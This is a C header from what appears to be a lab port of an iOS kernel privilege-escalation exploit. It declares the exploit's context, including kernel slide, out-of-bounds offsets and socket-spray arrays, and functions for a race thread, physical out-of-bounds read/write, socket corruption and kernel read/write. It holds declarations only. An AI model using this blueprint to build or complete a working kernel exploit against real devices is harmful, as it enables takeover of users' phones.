// common.h - DO NOT MODIFY
// This is the source of truth for all types in your project
#ifndef common_h
#define common_h

// Lumina port: IOSurface framework is linked but its iOS SDK headers are
// partial; declare the Ref ourselves and extern the entry points in surface.c.
typedef struct __IOSurface *IOSurfaceRef;

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <sys/syslimits.h>
#include <sys/uio.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <mach-o/dyld.h>

// Lumina lab log sink (durable Documents log + return-string), defined in
// LuminaClearSword.m. Keeps the upstream usleep pacing after each line.
void cs_log_line(const char *fmt, ...);

#define LOG(fmt, ...)     do { cs_log_line("[i] " fmt, ##__VA_ARGS__); } while (0)
#define LOG_ERR(fmt, ...) do { cs_log_line("[err] " fmt, ##__VA_ARGS__); } while (0)
#define LOG_DEBUG(fmt, ...) do { cs_log_line("[debug] " fmt, ##__VA_ARGS__); } while (0)

// Lab run limits (not upstream): stop the hunt instead of looping forever.
// A panic leaves the durable log; a stall returns with the log instead.
#define CS_TIME_BUDGET_SEC 120
extern volatile int    g_cs_stop;
extern volatile time_t g_cs_deadline;
static inline int cs_expired(void) {
    if (g_cs_stop) return 1;
    if (g_cs_deadline && time(NULL) > g_cs_deadline) { g_cs_stop = 1; return 1; }
    return 0;
}

#define TARGET_FILE_SIZE 0x8000  // 2 pages
#define MAX_OPEN_FDS 10240       // bsd/sys/syslimits.h
#define MAX_SOCKETS_COUNT 0x5800
#define MAX_LOCKED_SURFACES 8

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t* address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t* address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

// FIX: Define free_thread_shared_t ONLY HERE - no redefinition elsewhere
typedef struct free_thread_shared {
    _Atomic uint64_t free_thread_start;
    _Atomic uint64_t free_target_sync;
    _Atomic uint64_t free_target_size_sync;
    _Atomic uint64_t target_object_sync;
    _Atomic uint64_t target_object_offset_sync;
    _Atomic uint64_t go_sync;
    _Atomic uint64_t race_sync;
} free_thread_shared_t;

typedef struct mlock_surfaces {
    mach_vm_address_t address;
    IOSurfaceRef surface;
} mlock_surfaces_t;

typedef struct offsets {
    uint32_t ios_major_version;
    uint32_t ios_minor_version;
    uint64_t inpcb_icmp6filt;
    uint64_t inpcb_inp_socket;
    uint64_t socket_so_count;
    uint64_t socket_so_background_thread;
    uint64_t thread_t_ro;
    uint64_t thread_ro_proc;
    uint64_t proc_p_ro;
    uint64_t proc_ro_task;
    uint64_t task_map;
    uint64_t map_pmap;
} offsets_t;

typedef struct pe_context {
    offsets_t offsets;

    char device_machine[256];
    char executable_name[256];  // oracle
    char read_file_path[PATH_MAX];
    char write_file_path[PATH_MAX];

    size_t target_file_size;
    uint64_t oob_offset;
    uint64_t oob_size;
    uint64_t n_of_oob_pages;

    mach_vm_address_t pc_address;
    mach_vm_size_t pc_size;
    mach_port_t pc_object;
    mach_vm_address_t free_target;
    mach_vm_size_t free_target_size;

    int write_fd;
    int read_fd;

    uint64_t random_marker;
    uint64_t wired_page_marker;

    free_thread_shared_t* shared;
    pthread_t free_thread;
    bool free_thread_started;

    struct iovec iov;
    uint64_t highiest_success_idx;
    uint64_t success_read_count;

    int control_socket;
    int rw_socket;
    uint64_t control_socket_pcb;
    uint64_t rw_socket_pcb;

    uint8_t control_data[0x20];
    uint8_t early_kwrite64_write_buf[0x20];
    uint8_t kwrite_length_buffer[0x20];

    uint8_t* default_file_content;
    uint8_t* getsockopt_read_data;

    bool is_a18_devices;
    uint64_t kernel_base;
    uint64_t kernel_slide;

    mach_port_t socket_ports[MAX_SOCKETS_COUNT];
    uint64_t socket_pcb_ids[MAX_SOCKETS_COUNT];
    size_t socket_ports_count;

    mlock_surfaces_t mlock_surfaces[MAX_LOCKED_SURFACES];
    size_t mlock_surfaces_count;
} pe_context_t;

// FIX: Add extern declarations for ALL global variables
extern pe_context_t g_ctx;
extern offsets_t g_offsets;
extern volatile int churn_go;

// Function declarations
kern_return_t pe_init(void);
kern_return_t pe_v1(void);
kern_return_t pe(void);
int clearsword_run(void);
int offsets_init(void);
char* get_device_machine(void);
void init_target_file(void);
void krw_sockets_leak_forever(void);
uint64_t spray_socket(void);
void sockets_release(void);
kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_t seeking_offset,
                                      uint8_t* read_buffer, uint8_t* write_buffer,
                                      uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT],
                                      size_t* target_inp_gencnt_count, bool do_read);
kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size,
                                   uint64_t offset, uint8_t* buffer);
void physical_oob_read_mo_with_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset,
                                     uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer);
void physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size,
                           uint64_t offset, uint8_t* buffer);
void initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size);
uint64_t unpac_ptr(uint64_t kptr);
bool is_arm64e(void);
void *churn_thread(void *arg);
void* free_thread_worker(void* arg);

#endif /* common_h */
